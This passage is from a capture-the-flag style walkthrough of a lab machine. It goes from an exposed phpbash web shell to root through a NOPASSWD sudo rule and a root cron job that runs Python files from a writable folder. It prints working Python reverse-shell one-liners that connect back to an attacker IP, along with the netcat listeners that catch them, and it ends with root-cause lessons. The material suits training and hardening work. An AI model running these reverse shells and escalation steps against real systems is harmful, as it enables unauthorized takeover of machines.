## 3. Upgrade to a Reverse Shell

A web shell is clunky — get a proper interactive shell.

**On Kali, start a listener first:**

```bash
nc -lnvp 1235
```

**In the phpbash web shell**, paste (replace with your Kali `tun0` IP):

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_KALI_IP",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Your listener catches a shell as `www-data`. Upgrade to a full TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 4. Privilege Escalation Path 1 — www-data → scriptmanager

Check sudo rights:

```bash
sudo -l
```

You'll see:

```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

This means `www-data` can become `scriptmanager` with no password. Do it:

```bash
sudo -u scriptmanager /bin/bash
```

Confirm:

```bash
id
```

---

## 5. Enumerate as scriptmanager

Look around scriptmanager's home and permissions:

```bash
ls -ld /scripts
cd /scripts
ls -l
```

You'll find:

- `test.py` — owned by scriptmanager, writable by you
- `test.txt` — owned by **root**, and its contents keep regenerating every minute or so

That regeneration is the giveaway: **something running as root is executing `.py` files in this folder on a timer** (a cron job). `test.py` just writes "testing 123!" to `test.txt` — so whatever runs it, runs as root.

You can confirm the cron itself later once you have root:

```bash
crontab -l
# or check
cat /etc/crontab
```

It reads:

```
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```

This loop runs **every visible `.py` file** in `/scripts` once a minute, as root. Note: `*.py` is a bash glob and does **not** match hidden dotfiles (`.foo.py`) — so your payload filename must NOT start with a dot.

## 6. Privilege Escalation Path 2 — scriptmanager → root

**Step 1 — Start a listener on Kali (new terminal/port):**

```bash
nc -lnvp 31337
```

**Step 2 — Drop a reverse shell payload into `/scripts`.**

As scriptmanager, in `/scripts`:

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_KALI_IP\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > shell.py
```

Notes:

- Replace `YOUR_KALI_IP` with your actual tun0 IP.
- File is named `shell.py` — no leading dot, or the cron's glob will silently ignore it.
- **Do not run this file yourself.** If you execute it manually, the shell that connects back will just be scriptmanager, not root — you need the cron job (running as root) to be the one that executes it.

**Step 3 — Wait.**

Cron fires once a minute. Within ~60 seconds it'll pick up `shell.py` and run it.

**Step 4 — Catch the root shell.**

Your `nc -lnvp 31337` listener should receive a connection. Verify:

```bash
id
```

Expected:

```
uid=0(root) gid=0(root) groups=0(root)
```

Upgrade the shell for comfort:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Summary of the Chain

|Step|Access|Method|
|---|---|---|
|1|www-data|phpbash web shell exposed at `/dev/phpbash.php`|
|2|scriptmanager|`sudo -u scriptmanager /bin/bash` (NOPASSWD ALL misconfig)|
|3|root|Cron job runs any `.py` file in `/scripts` every minute as root — drop a reverse shell payload and wait|

**Root causes / lessons:**

- Exposing a dev/debug web shell (`phpbash.php`) publicly is a full RCE-as-a-service.
- A `NOPASSWD: ALL` sudo rule to another user is nearly as good as sudo to root if that user has any privileged access path.
- A root-owned cron job that executes files from a directory writable by a lower-privileged user is a classic privesc — always check `ls -la` on directories referenced by cron, and check write permissions on anything root's crontab touches.
